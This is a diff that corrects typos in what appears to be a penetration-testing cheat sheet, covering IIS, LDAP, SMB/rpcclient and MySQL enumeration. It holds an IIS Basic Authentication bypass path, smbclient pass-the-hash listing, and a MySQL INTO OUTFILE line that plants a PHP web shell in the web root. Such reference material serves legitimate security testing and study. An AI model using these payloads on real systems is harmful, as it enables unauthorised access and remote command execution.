@@ -107,7 +107,7 @@
       - System.Web.Mvc.Html.dll
   - Microsoft IIS tilde character “~” Vulnerability
   - Basic Authentication bypass (IIS 7.5) by trying to access
-    - /admin:$i30$INDEX_ALLOCATION/admin.php
+    - /admin:$i30:$INDEX_ALLOCATION/admin.php
     - /admin::$INDEX_ALLOCATION/admin.php
   - Grabbing Banner for Version
   - Directory BruteForce
@@ -138,7 +138,7 @@
   - Extracting Users
     - ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=
     - <1_SUBDOMAIN>,DC=<TDL>"
-  - 4Extracting Computers
+  - Extracting Computers
     - ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=
     - <1_SUBDOMAIN>,DC=<TDL>"
   - Extracting my info
@@ -174,7 +174,7 @@
     - List alias: enumalsgroups <builtin|domain>
     - Get members: queryaliasmem builtin|domain <0xrid>
     - List domains: enumdomains
-    - Get SID lsaquery
+    - Get SID: lsaquery
     - Domain info: querydominfo
     - Find SIDs by name: lookupnames <username>
     - Find more SIDs: lsaenumsid
@@ -183,7 +183,7 @@
     - Null Session
       - smbclient --no-pass -L //<IP>
     - Listinng Shares with Credentials
-      - 5smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>
+      - smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>
   - Mount share
     - Without Credential
       - mount -t cifs //x.x.x.x/share /mnt/share
@@ -231,8 +231,8 @@
       - select user,file_priv from mysql.user where user='root';
     - Enumerating Current User
       - select user();
-    - 6Writing File
-      - select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C/xampp/htdocs/shell.php';
+    - Writing File
+      - select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/shell.php';
     - Reading file
       - select load_file('/home/purabparihar/read_file.txt');
     - User password change
